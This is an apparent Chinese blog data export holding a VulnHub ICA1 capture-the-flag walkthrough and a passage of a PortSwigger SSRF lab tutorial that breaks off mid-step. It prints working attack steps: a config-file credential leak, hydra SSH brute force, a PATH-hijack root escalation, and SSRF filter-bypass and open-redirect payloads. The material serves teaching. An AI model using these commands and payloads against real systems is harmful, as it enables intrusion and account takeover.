-f\n```\n\n![](https://i.loli.net/2021/11/01/cskMQEIqhPKT2fY.png)\n\n![](https://i.loli.net/2021/11/01/rUxToiE435wZ62q.png)\n\n成功得到了两组ssh的用户名和密码，尝试登录ssh\n\n先登录`travis`账号，获取到了第一个flag\n\n![](https://i.loli.net/2021/11/01/tCaRQhxnyWjlABZ.png)\n\n再登录`dexter`，看到有提示，应该是要利用可执行文件来提权\n\n<img src=\"https://i.loli.net/2021/11/01/i5gulQ2FmUo9j6b.png\" style=\"zoom: 80%;\" />\n\n### 权限提升\n\n先查看一下有执行权限的文件\n\n```\nfind / -perm -u=s 2>/dev/null\n```\n\n![](https://i.loli.net/2021/11/01/o3u5HCDSTckYPmG.png)\n\n用strings查看一下`/opt/get_access`\n\n![](https://i.loli.net/2021/11/01/BsXuYOF3ymfWdNl.png)\n\n可以推测执行`/opt/get_access`时会进行`setuid`操作，接着会执行`cat`命令\n\n为了证明我们的推测，我们对`get_access`进行反编译，我们通过伪代码可以比较清晰地看到，当执行`get_access`时会执行`setuid(0)`，再执行`cat`命令打印系统信息,并且执行的`cat`命令是没有指定路径的\n\n<img src=\"https://i.loli.net/2021/11/01/x7yHcPQhgoUrDG2.png\" style=\"zoom: 80%;\" />\n\n接下来我们可以通过伪造一个文件名为`cat`的可执行文件，文件内容为`/bin/bash`，并将文件路径设置为环境变量，这样执行`get_access`的时候，就会执行我们伪造的`cat`文件，从而使我们获得root权限\n\n```\necho '/bin/bash' > /tmp/cat\nchmod +x /tmp/cat \necho $PATH\nexport PATH=/tmp:$PATH\n/opt/get_access\n```\n\n![](https://i.loli.net/2021/11/01/z4WNPo1MdavIbrs.png)\n\n我们已经成功得到了root权限，最后我们通过`more`命令获取第二个flag\n\n![](https://i.loli.net/2021/11/01/yciWRaIrQzpNfk3.png)\n","slug":"ICA1-VulnHub-Walkthrough","published":1,"updated":"2021-12-25T12:19:50.095Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl5up2nye000bwku1d89q6i8t","content":"<h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><pre><code>arp-scan -l\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/11/01/DtOf6MJVR5ndoGe.png\"></p>\n<h3 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h3><pre><code>nmap -Pn -p- 192.168.62.182\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/11/01/xCtO6cIAsQMSLDi.png\"></p>\n<p>开放了22、80、3306端口</p>\n<p>访问80端口，是一个登录界面</p>\n<img src=\"https://i.loli.net/2021/11/01/1ejgDTcrmNXdtRw.png\" style=\"zoom:80%;\" />\n\n<p>qdPM是一个开源的项目管理系统，基于<a href=\"http://www.oschina.net/p/symfony\">Symfony</a>框架+PHP/MySQL开发，可以看到qdPM的版本为9.2</p>\n<h3 id=\"漏洞发现\"><a href=\"#漏洞发现\" class=\"headerlink\" title=\"漏洞发现\"></a>漏洞发现</h3><p>搜索一下exploit-db看看有没有公开的exp</p>\n<p><img src=\"https://i.loli.net/2021/11/01/yZIxHGg2QtN9LiS.png\"></p>\n<p>可以看到这个版本存在数据库敏感信息泄露，可以未授权获取数据库连接信息和密码</p>\n<p>看一下利用方式</p>\n<p><img src=\"https://i.loli.net/2021/11/01/6NC3oaG9FzRYWrl.png\"></p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>我们可以通过访问<code>http://&lt;website&gt;/core/config/databases.yml</code>来下载包含数据库连接信息和密码的yml文件</p>\n<img src=\"https://i.loli.net/2021/11/01/4WVgx7HBS19dC2P.png\" style=\"zoom:80%;\" />\n\n<p>通过访问<code>http://192.168.62.182/core/config/databases.yml</code>成功得到了数据库的用户名和密码<code>qdpmadmin:UcVQCMQk2STVeS6J</code></p>\n<p>接下来尝试登录数据库，进一步获取敏感信息</p>\n<pre><code>mysql -u qdpmadmin -h 192.168.62.182 -p\n</code></pre>\n<img src=\"https://i.loli.net/2021/11/01/CGJbOxwdtpsjXzD.png\" style=\"zoom:80%;\" />\n\n<p>在<code>staff</code>数据库中找到了五组用户名和密码，密码是经过编码加密的</p>\n<img src=\"https://i.loli.net/2021/11/01/wFHBokpdDs89Aj3.png\" style=\"zoom:80%;\" />\n\n<h3 id=\"SSH密码爆破\"><a href=\"#SSH密码爆破\" class=\"headerlink\" title=\"SSH密码爆破\"></a>SSH密码爆破</h3><p>将经过base64编码的密码字符串解码一下，记录到一个文本中</p>\n<p><img src=\"https://i.loli.net/2021/11/01/QaPujeoxcKYhXGm.png\"></p>\n<p>将用户名也记录到一个文本中</p>\n<p><img src=\"https://i.loli.net/2021/11/01/ljuvOXPLYSUmhd5.png\"></p>\n<p>用账户密码来爆破80端口的登陆界面无果，只能尝试爆破22端口了</p>\n<pre><code>hydra -L user -P password ssh://192.168.62.182 -f\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/11/01/cskMQEIqhPKT2fY.png\"></p>\n<p><img src=\"https://i.loli.net/2021/11/01/rUxToiE435wZ62q.png\"></p>\n<p>成功得到了两组ssh的用户名和密码，尝试登录ssh</p>\n<p>先登录<code>travis</code>账号，获取到了第一个flag</p>\n<p><img src=\"https://i.loli.net/2021/11/01/tCaRQhxnyWjlABZ.png\"></p>\n<p>再登录<code>dexter</code>，看到有提示，应该是要利用可执行文件来提权</p>\n<img src=\"https://i.loli.net/2021/11/01/i5gulQ2FmUo9j6b.png\" style=\"zoom: 80%;\" />\n\n<h3 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h3><p>先查看一下有执行权限的文件</p>\n<pre><code>find / -perm -u=s 2&gt;/dev/null\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/11/01/o3u5HCDSTckYPmG.png\"></p>\n<p>用strings查看一下<code>/opt/get_access</code></p>\n<p><img src=\"https://i.loli.net/2021/11/01/BsXuYOF3ymfWdNl.png\"></p>\n<p>可以推测执行<code>/opt/get_access</code>时会进行<code>setuid</code>操作，接着会执行<code>cat</code>命令</p>\n<p>为了证明我们的推测，我们对<code>get_access</code>进行反编译，我们通过伪代码可以比较清晰地看到，当执行<code>get_access</code>时会执行<code>setuid(0)</code>，再执行<code>cat</code>命令打印系统信息,并且执行的<code>cat</code>命令是没有指定路径的</p>\n<img src=\"https://i.loli.net/2021/11/01/x7yHcPQhgoUrDG2.png\" style=\"zoom: 80%;\" />\n\n<p>接下来我们可以通过伪造一个文件名为<code>cat</code>的可执行文件，文件内容为<code>/bin/bash</code>，并将文件路径设置为环境变量，这样执行<code>get_access</code>的时候，就会执行我们伪造的<code>cat</code>文件，从而使我们获得root权限</p>\n<pre><code>echo &#39;/bin/bash&#39; &gt; /tmp/cat\nchmod +x /tmp/cat \necho $PATH\nexport PATH=/tmp:$PATH\n/opt/get_access\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/11/01/z4WNPo1MdavIbrs.png\"></p>\n<p>我们已经成功得到了root权限，最后我们通过<code>more</code>命令获取第二个flag</p>\n<p><img src=\"https://i.loli.net/2021/11/01/yciWRaIrQzpNfk3.png\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><pre><code>arp-scan -l\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/11/01/DtOf6MJVR5ndoGe.png\"></p>\n<h3 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h3><pre><code>nmap -Pn -p- 192.168.62.182\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/11/01/xCtO6cIAsQMSLDi.png\"></p>\n<p>开放了22、80、3306端口</p>\n<p>访问80端口，是一个登录界面</p>\n<img src=\"https://i.loli.net/2021/11/01/1ejgDTcrmNXdtRw.png\" style=\"zoom:80%;\" />\n\n<p>qdPM是一个开源的项目管理系统，基于<a href=\"http://www.oschina.net/p/symfony\">Symfony</a>框架+PHP/MySQL开发，可以看到qdPM的版本为9.2</p>\n<h3 id=\"漏洞发现\"><a href=\"#漏洞发现\" class=\"headerlink\" title=\"漏洞发现\"></a>漏洞发现</h3><p>搜索一下exploit-db看看有没有公开的exp</p>\n<p><img src=\"https://i.loli.net/2021/11/01/yZIxHGg2QtN9LiS.png\"></p>\n<p>可以看到这个版本存在数据库敏感信息泄露，可以未授权获取数据库连接信息和密码</p>\n<p>看一下利用方式</p>\n<p><img src=\"https://i.loli.net/2021/11/01/6NC3oaG9FzRYWrl.png\"></p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>我们可以通过访问<code>http://&lt;website&gt;/core/config/databases.yml</code>来下载包含数据库连接信息和密码的yml文件</p>\n<img src=\"https://i.loli.net/2021/11/01/4WVgx7HBS19dC2P.png\" style=\"zoom:80%;\" />\n\n<p>通过访问<code>http://192.168.62.182/core/config/databases.yml</code>成功得到了数据库的用户名和密码<code>qdpmadmin:UcVQCMQk2STVeS6J</code></p>\n<p>接下来尝试登录数据库，进一步获取敏感信息</p>\n<pre><code>mysql -u qdpmadmin -h 192.168.62.182 -p\n</code></pre>\n<img src=\"https://i.loli.net/2021/11/01/CGJbOxwdtpsjXzD.png\" style=\"zoom:80%;\" />\n\n<p>在<code>staff</code>数据库中找到了五组用户名和密码，密码是经过编码加密的</p>\n<img src=\"https://i.loli.net/2021/11/01/wFHBokpdDs89Aj3.png\" style=\"zoom:80%;\" />\n\n<h3 id=\"SSH密码爆破\"><a href=\"#SSH密码爆破\" class=\"headerlink\" title=\"SSH密码爆破\"></a>SSH密码爆破</h3><p>将经过base64编码的密码字符串解码一下，记录到一个文本中</p>\n<p><img src=\"https://i.loli.net/2021/11/01/QaPujeoxcKYhXGm.png\"></p>\n<p>将用户名也记录到一个文本中</p>\n<p><img src=\"https://i.loli.net/2021/11/01/ljuvOXPLYSUmhd5.png\"></p>\n<p>用账户密码来爆破80端口的登陆界面无果，只能尝试爆破22端口了</p>\n<pre><code>hydra -L user -P password ssh://192.168.62.182 -f\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/11/01/cskMQEIqhPKT2fY.png\"></p>\n<p><img src=\"https://i.loli.net/2021/11/01/rUxToiE435wZ62q.png\"></p>\n<p>成功得到了两组ssh的用户名和密码，尝试登录ssh</p>\n<p>先登录<code>travis</code>账号，获取到了第一个flag</p>\n<p><img src=\"https://i.loli.net/2021/11/01/tCaRQhxnyWjlABZ.png\"></p>\n<p>再登录<code>dexter</code>，看到有提示，应该是要利用可执行文件来提权</p>\n<img src=\"https://i.loli.net/2021/11/01/i5gulQ2FmUo9j6b.png\" style=\"zoom: 80%;\" />\n\n<h3 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h3><p>先查看一下有执行权限的文件</p>\n<pre><code>find / -perm -u=s 2&gt;/dev/null\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/11/01/o3u5HCDSTckYPmG.png\"></p>\n<p>用strings查看一下<code>/opt/get_access</code></p>\n<p><img src=\"https://i.loli.net/2021/11/01/BsXuYOF3ymfWdNl.png\"></p>\n<p>可以推测执行<code>/opt/get_access</code>时会进行<code>setuid</code>操作，接着会执行<code>cat</code>命令</p>\n<p>为了证明我们的推测，我们对<code>get_access</code>进行反编译，我们通过伪代码可以比较清晰地看到，当执行<code>get_access</code>时会执行<code>setuid(0)</code>，再执行<code>cat</code>命令打印系统信息,并且执行的<code>cat</code>命令是没有指定路径的</p>\n<img src=\"https://i.loli.net/2021/11/01/x7yHcPQhgoUrDG2.png\" style=\"zoom: 80%;\" />\n\n<p>接下来我们可以通过伪造一个文件名为<code>cat</code>的可执行文件，文件内容为<code>/bin/bash</code>，并将文件路径设置为环境变量，这样执行<code>get_access</code>的时候，就会执行我们伪造的<code>cat</code>文件，从而使我们获得root权限</p>\n<pre><code>echo &#39;/bin/bash&#39; &gt; /tmp/cat\nchmod +x /tmp/cat \necho $PATH\nexport PATH=/tmp:$PATH\n/opt/get_access\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/11/01/z4WNPo1MdavIbrs.png\"></p>\n<p>我们已经成功得到了root权限，最后我们通过<code>more</code>命令获取第二个flag</p>\n<p><img src=\"https://i.loli.net/2021/11/01/yciWRaIrQzpNfk3.png\"></p>\n"},{"title":"PortSwigger Web Security Academy-SSRF","date":"2022-07-21T06:22:15.000Z","_content":"\n## SSRF简介\n\n**SSRF**（Server-Side Request Forgery，服务器端请求伪造），漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。因此存在SSRF漏洞的服务器通常被作为跳板机来取得外网或内网其它应用服务器的信息。\n\n## 漏洞危害\n\nSSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。\n\n内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。\n\n## 常见的 SSRF 攻击\n\n**SSRF 攻击通常利用信任关系来升级易受攻击的应用程序的攻击并执行未经授权的操作。**这些信任关系可能与服务器本身有关，也可能与同一组织内的其他后端系统有关。\n\n### 针对服务器本身的SSRF攻击\n\n在针对服务器本身的 SSRF 攻击中，攻击者诱使应用程序通过其环回网络接口向托管应用程序的服务器发出 HTTP 请求。这通常涉及提供带有主机名的 URL，例如`127.0.0.1`（指向环回适配器的保留 IP 地址）或`localhost`（同一适配器的常用名称）。\n\n例如，考虑一个购物应用程序，它允许用户查看某项商品是否在特定商店中有库存。要提供库存信息，应用程序必须查询各种后端 REST API，具体取决于相关产品和商店。该功能是通过前端 HTTP 请求将 URL 传递给相关的后端 API 端点来实现的。因此，当用户查看商品的库存状态时，他们的浏览器会发出如下请求：\n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1\n```\n\n这会导致服务器向指定的 URL 发出请求，检索库存状态并将其返回给用户。\n\n在这种情况下，攻击者可以修改请求以指定服务器本身的本地 URL。例如：\n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://localhost/admin\n```\n\n在这里，服务器将获取`/admin`URL 的内容并将其返回给用户。\n\n当然，攻击者可以直接访问`/admin`URL。但管理功能通常只有经过身份验证的合适用户才能访问。因此，直接访问 URL 的攻击者不会看到任何感兴趣的内容。但是，当对`/admin`URL 的请求来自本地机器本身时，会绕过正常的[访问控制。](https://portswigger.net/web-security/access-control)应用程序授予对管理功能的完全访问权限，因为该请求似乎来自受信任的位置。\n\n### 针对其他后端系统的 SSRF 攻击\n\n服务器端请求伪造经常出现的另一种类型的信任关系是应用程序服务器能够与用户无法直接访问的其他后端系统进行交互。这些系统通常具有不可路由的私有 IP 地址。由于后端系统通常受到网络拓扑的保护，因此它们通常具有较弱的安全态势。在许多情况下，内部后端系统包含敏感功能，任何能够与系统交互的人无需身份验证即可访问这些功能。\n\n在前面的示例中，假设后端 URL 有一个管理界面` https://192.168.0.68/admin`。在这里，攻击者可以通过提交以下请求，利用 SSRF 漏洞访问管理界面：\n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://192.168.0.68/admin\n```\n\n## 针对本地服务器的基本SSRF\n\n### 靶场地址\n\n[web-security/ssrf/lab-basic-ssrf-against-localhost](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)\n\n### 靶场说明\n\n该实验室具有库存检查功能，可从内部系统获取数据。\n\n要完成这个实验，请更改库存检查 URL 以访问管理界面`http://localhost/admin`并删除用户`carlos`。\n\n### 实验步骤\n\n1、浏览`/admin`并观察您无法直接访问管理页面。\n\n![](https://s2.loli.net/2022/07/20/6pzPSZRtXUT81AO.png)\n\n2、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。\n\n![](https://s2.loli.net/2022/07/20/PR3dI6cXVeOJsQo.png)\n\n![](https://s2.loli.net/2022/07/20/Nu3VzDg9avWqXj2.png)\n\n3、将`stockApi`参数中 的 URL 更改为`http://localhost/admin`。发送请求包后能看到管理界面。\n\n![](https://s2.loli.net/2022/07/20/v6cwAsStLm4yDRO.png)\n\n4、读取HTML识别删除目标用户的URL，即：`http://localhost/admin/delete?username=carlos`\n\n![](https://s2.loli.net/2022/07/20/Ypk2GVzy71fKm4E.png)\n\n5、成功删除carlos用户。\n\n![](https://s2.loli.net/2022/07/20/oWeSXncfQGgdxbu.png)\n\n![](https://s2.loli.net/2022/07/20/SAGZUvFY41kD2OX.png)\n\n### 小结\n\n为什么应用程序会以这种方式运行，并且缺省信任来自本地计算机的请求？这可能由于各种原因而出现：\n\n- 访问控制检查可能在位于应用程序服务器前面的不同组件中实现。 **当与服务器本身建立连接时，会绕过检查。**\n- 出于灾难恢复的目的，**应用程序可能允许来自本地计算机的任何用户在不登录的情况下进行管理访问**。这为管理员提供了一种在丢失凭据时恢复系统的方法。这里的假设是只有完全信任的用户会直接来自服务器本身。\n- 管理界面可能正在侦听与主应用程序不同的端口号，因此用户可能无法直接访问。\n\n这种信任关系（来自本地机器的请求的处理方式与普通请求不同）通常是使 SSRF 成为严重漏洞的原因。\n\n## 针对其他后端系统的 SSRF 攻击\n\n### 靶场地址\n\n[web-security/ssrf/lab-basic-ssrf-against-backend-system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)\n\n### 靶场说明\n\n该实验室具有库存检查功能，可从内部系统获取数据。\n\n要完成实验，请使用库存检查功能`192.168.0.X`在端口 8080 上扫描管理界面的内部范围，然后使用它删除用户`carlos`。\n\n### 实验步骤\n\n简单点说就是上一个实验+爆破url\n\n1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送给 Burp Intruder。\n\n2、先清除标记，然后将`stockApi`参数中的url更改为`http://192.168.0.1:8080/admin`，并标记IP地址的最后一位，即标记“1”。\n\n![](https://s2.loli.net/2022/07/20/of5wsKZhJTQilXC.png)\n\n3、切换到 Payloads 选项，将Payload类型更改为 Numbers，并在“From”和“To”和“Step”框中分别输入 1、255 和 1。\n\n![](https://s2.loli.net/2022/07/20/ihI1bAo528JYNUd.png)\n\n4、开始攻击。单击“Status”列按状态码升序对其进行排序。您应该看到一个状态为 200 的条目，显示一个管理界面。\n\n![](https://s2.loli.net/2022/07/20/LUaczrjxIiBQ2gq.png)\n\n5、现在我们知道管理地址为192.168.1.252/admin。单击此请求，将其发送到 Repeater，并将路径更改为：`/admin/delete?username=carlos`，即可删除`carlos`用户。\n\n![](https://s2.loli.net/2022/07/20/QBJK1U8lwqLmP4i.png)\n\n## 常见的 SSRF 防御绕过\n\n通常会看到包含 SSRF 行为的应用程序以及旨在防止恶意利用的防御措施。通常，可以绕过这些防御措施。\n\n* 绕过基于黑名单的 SSRF防御措施\n\n* 绕过基于白名单的SSRF防御措施\n\n* 通过开放重定向绕过SSRF防御措施\n\n## 基于黑名单的SSRF防御措施绕过\n\n一些应用程序会阻止包含诸如`127.0.0.1`、`localhost`之类的主机名或诸如`/admin`之类的url，在这种情况下，您通常可以使用各种技术绕过过滤器：\n\n- 使用替代 IP 表示`127.0.0.1`，例如`2130706433`、`017700000001`或`127.1`。\n- 将您自己的域名解析为`127.0.0.1`. 您可以`spoofed.burpcollaborator.net`用于此目的。\n- 使用 URL 编码或大小写变体混淆被阻止的字符串。\n\n### 靶场地址\n\n[web-security/ssrf/lab-ssrf-with-blacklist-filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)\n\n### 靶场说明\n\n该实验室具有库存检查功能，可从内部系统获取数据。\n\n要完成实验，请更改库存检查 URL 以访问管理界面`http://localhost/admin`并删除用户`carlos`。\n\n开发人员部署了两个需要绕过的SSRF 弱防御措施。\n\n### 实验步骤\n\n1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。将`stockApi`参数中 的 URL 更改为`http://127.0.0.1/`，观察到请求被阻止。\n\n![](https://s2.loli.net/2022/07/20/9GVIfWYCJvoRl8p.png)\n\n2、通过将 URL 更改为：`http://localhost/`,还是被防火墙拦截了!\n\n![](https://s2.loli.net/2022/07/20/gU8ZfXyls3DIM1T.png)\n\n3、通过双 URL 编码将`a`混淆为 `%25%36%31`,此时为`http://loc%25%36%31lhost/`。防火墙未拦截，成功以管理员身份访问系统。\n\n![](https://s2.loli.net/2022/07/20/DIlsn7wHzvSxGKR.png)\n\n4、搜索管理面板url\n\n![](https://s2.loli.net/2022/07/20/bJKO8hWygCVB1a5.png)\n\n5、访问管理面板\n\n![](https://s2.loli.net/2022/07/20/N8e7TJIXoyVauBK.png)\n\n6、又拦截了，再次将admin中的`a`url编码两次提交,绕过防火墙!\n\n![](https://s2.loli.net/2022/07/20/wQOf8Emn6P4rdyu.png)\n\n7、删除carlos账户\n\n![](https://s2.loli.net/2022/07/20/XfptgY2mdOKSWjz.png)\n\n8、验证一下看是不是删除掉了，目前只剩下一个账户,成功删除carlos,实验完成.\n\n![](https://s2.loli.net/2022/07/20/N5t6hrVaTOfo42e.png)\n\n## 基于白名单的 SSRF防御措施\n\n某些应用程序只允许匹配、或包含允许值的白名单的输入。在这种情况下，您有时可以通过利用 URL 解析中的不一致来绕过过滤器。\n\nURL 规范包含许多在实现 URL的即时解析和验证时容易被忽视的特性：\n\n- 您可以使用`@`字符 在主机名之前的 URL 中嵌入凭据。例如：`https://expected-host@evil-host`\n- 您可以使用`#`字符来指示 URL 片段。例如：`https://evil-host#expected-host`\n- 您可以利用 DNS 命名层次结构将所需的输入放入您控制的完全限定的 DNS 名称中。例如：`https://expected-host.evil-host`\n- 您可以对字符进行 URL 编码以混淆 URL 解析代码。如果实现过滤器的代码处理 URL 编码字符的方式不同于执行后端 HTTP 请求的代码，这将特别有用。\n- 您可以一起使用这些技术的组合。\n\n### 靶场地址\n\n[web-security/ssrf/lab-ssrf-with-whitelist-filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)\n\n### 靶场说明\n\n该实验室具有库存检查功能，可从内部系统获取数据。\n\n要完成实验，请更改库存检查 URL 以访问管理界面`http://localhost/admin`并删除用户`carlos`。\n\n**开发人员已经部署了您需要绕过的反 SSRF 防御。**\n\n### 实验思路\n\n1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。\n\n将`stockApi`参数中 的 URL 更改为`http://127.0.0.1/`并观察应用程序正在解析 URL、提取主机名并根据白名单对其进行验证。\n\n![](https://s2.loli.net/2022/07/20/L7lOQnhRy49VAja.png)\n\n2、将 URL 更改为`http://username@stock.weliketoshop.net/`并观察它是否被接受，这表明 URL 解析器支持嵌入式凭据。\n\n![](https://s2.loli.net/2022/07/20/FZI8wMgnGbPoixC.png)\n\n3、将`#`附加到用户名后并观察到该 URL 现在被拒绝。\n\n![](https://s2.loli.net/2022/07/20/CZVYM1XjwbWRsNt.png)\n\n4、双 URL 编码`#`为`%2523`，并观察到响应，表明服务器已经访问localhost。\n\n![](https://s2.loli.net/2022/07/20/wL82XeydGsgpqUW.png)\n\n5、改成如下url:访问到admin页面\n\n![](https://s2.loli.net/2022/07/20/13UBzIgY5oVGxvn.png)\n\n6、要访问管理界面并删除目标用户，请将 URL 更改为：`http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`\n\n![](https://s2.loli.net/2022/07/20/AhlNIv48S92Mcrm.png)\n\n## 通过开放重定向漏洞绕过的 SSRF防御\n\n有时可以通过利用开放重定向漏洞来绕过任何类型的基于过滤器的防御。\n\n在前面的 SSRF 示例中，假设用户提交的 URL 经过严格验证，以防止恶意利用 SSRF 行为。但是，允许 URL 的应用程序包含一个开放重定向漏洞。如果用于发出后端 HTTP 请求的 API 支持重定向，则您可以构造一个满足过滤器的 URL 并导致重定向请求到所需的后端目标。\n\n例如，假设应用程序包含一个开放重定向漏洞，其中URL如下：\n\n```bash\n/product/nextProduct?currentProductId=6&path=http://evil-user.net\n```\n\n返回重定向到：\n\n```\nhttp://evil-user.net\n```\n\n您可以利用开放重定向漏洞绕过URL过滤器，利用SSRF漏洞如下：\n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin\n```\n\n这个 SSRF 漏洞利用有效，因为应用程序首先验证`stockAPI`提供的URL 是否在允许的域上，它就是。然后应用程序请求提供的 URL，这会触发打开重定向。它遵循重定向，并向攻击者选择的内部 URL 发出请求。\n\n### 靶场地址\n\n[web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)\n\n### 靶场说明\n\n该实验室具有库存检查功能，可从内部系统获取数据。\n\n要完成实验，请更改库存检查 URL 以访问管理界面`http://192.168.0.12:8080/admin`并删除用户`carlos`。\n\n库存检查器已被限制为只能访问本地应用程序，因此您需要首先找到影响应用程序的开放重定向漏洞。\n\n### 实验思路\n\n1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。\n\n尝试篡改`stockApi`参数，观察到无法让服务器直接向不同的主机发出请求。\n\n![](https://s2.loli.net/2022/07/20/DxULHK7S6ocXd9J.png)\n\n2、点击“下一个产品”，观察`path`参数被放入重定向响应的Location头中，导致开放重定向。\n\n![](https://s2.loli.net/2022/07/20/f2eQm8MokCt1xUW.png)\n\n3、创建一个利用开放重定向漏洞的 URL，并重定向到管理界面，并将其输入到库存检查器的`stockApi`参数中。构造payload如下：\n\n``` \n/product/nextProduct?path=http://192.168.0.12:8080/admin\n```\n\n   观察库存检查器是否遵循重定向并向您显示管理页面。\n\n![](https://s2.loli.net/2022/07/20/1TCabPfhIMFEZs8.png)\n\n4、修改路径以删除目标用户：\n\n```\n/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos\n```\n\n![](https://s2.loli.net/2022/07/20/OMnjRNU8lph9dxD.png)\n\n成功删除carlos,完成实验。\n\n## 盲 SSRF 漏洞\n\n盲 SSRF 通常更难利用，但有时会导致在服务器或其他后端组件上完全远程执行代码。\n\n### 什么是盲 SSRF？\n\n当可以诱导应用程序向提供的 URL 发出后端 HTTP 请求，但后端请求的响应未在应用程序的前端响应中返回时，就会出现盲 SSRF 漏洞。\n\n### 盲 SSRF 漏洞的影响是什么？\n\n盲 SSRF 漏洞的影响通常低于完全知情的 SSRF 漏洞，因为它们具有单向性。不能轻易利用它们从后端系统检索敏感数据，尽管在某些情况下可以利用它们来实现完整的远程代码执行。\n\n### 如何发现和利用盲 SSRF 漏洞\n\n检测盲 SSRF 漏洞最可靠的方法是使用带外 ( [OAST](https://portswigger.net/burp/application-security-testing/oast) ) 技术。这涉及尝试向您控制的外部系统触发 HTTP 请求，并监视与该系统的网络交互。\n\n使用带外技术最简单、最有效的方法是使用[Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)。您可以使用[Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成唯一的域名，将它们以有效负载的形式发送到应用程序，并监视与这些域的任何交互。如果观察到来自应用程序的传入 HTTP 请求，那么它很容易受到 SSRF 的攻击。\n\n```\n提示:\n在测试 SSRF 漏洞时，通常会观察到对提供的 Collaborator 域的 DNS 查找，但没有后续的 HTTP 请求。这通常是因为应用程序试图向域发出 HTTP 请求，这导致了初始 DNS 查找，但实际的 HTTP 请求被网络级过滤阻止。基础设施允许出站 DNS 流量是相对常见的，因为有很多目的都需要这样做，但会阻止与意外目的地的 HTTP 连接。\n```\n\n### 带外检测的盲SSRF\n\n简单地识别可以触发带外 HTTP 请求的盲[SSRF 漏洞](https://portswigger.net/web-security/ssrf)本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。\n\n### 靶场地址\n\n[portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)\n\n### 靶场说明\n\n该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。\n\n要解决实验室问题，请使用此功能向公共 Burp Collaborator 服务器发出 HTTP 请求。\n\n```\n注意事项:\n为了防止 Academy 平台被用于攻击第三方，我们的防火墙阻止了实验室与任意外部系统之间的交互。要解决实验室，您必须使用 Burp Collaborator 的默认公共服务器。\n```\n\n### 实验步骤\n\n1、在[Burp Suite Professional](https://portswigger.net/burp/pro)中，转到 Burp 菜单并启动[Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)。\n\n![](https://s2.loli.net/2022/07/20/TDyOd8hwWrEzsZG.png)\n\n2、单击“复制到剪贴板”以将唯一的 Burp Collaborator 有效负载复制到剪贴板。让 Burp Collaborator 客户端窗口保持打开状态。\n\n![](https://s2.loli.net/2022/07/20/F47CPxqtzypruD8.png)\n\n3、访问一个产品，在 Burp Suite 中拦截请求，并将其发送到 